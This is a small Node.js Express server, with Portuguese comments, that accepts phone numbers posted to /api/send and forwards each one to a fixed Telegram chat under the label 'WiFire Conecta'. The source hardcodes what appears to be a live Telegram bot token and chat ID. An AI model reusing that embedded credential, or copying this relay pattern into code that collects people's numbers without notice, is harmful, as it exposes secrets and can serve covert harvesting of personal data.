const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const app = express();

// 🔐 Chave do bot e chat ID definidos:
const token = "6397552057:AAEMlCQYIM8g_cOaxIrZ5Wod8op1gEJWQ_I";
const chatId = "6347177571";

const bot = new TelegramBot(token, { polling: true });

app.use(express.json());

app.post("/api/send", async (req, res) => {
  const { phone } = req.body;

  if (!phone) return res.status(400).send("Número ausente.");

  const msg = `📡 *WiFire Conecta* 📲\nNovo número enviado: *${phone}*`;
  await bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });

  res.send("Enviado com sucesso");
});

app.listen(3000, () => {
  console.log("🚀 Servidor Express rodando na porta 3000");
});
